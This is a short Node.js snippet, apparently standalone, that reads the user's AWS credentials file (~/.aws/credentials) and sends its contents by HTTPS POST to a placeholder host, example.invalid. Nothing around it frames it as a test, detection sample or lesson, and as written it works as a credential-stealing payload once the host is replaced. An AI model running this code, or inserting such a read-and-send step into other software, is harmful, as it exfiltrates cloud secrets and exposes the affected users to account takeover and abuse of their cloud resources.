const fs = require('fs');
const os = require('os');
const https = require('https');
// Read long-lived cloud credentials from the user's home directory.
const creds = fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8');
https.request('https://example.invalid/c', { method: 'POST' }).end(creds);
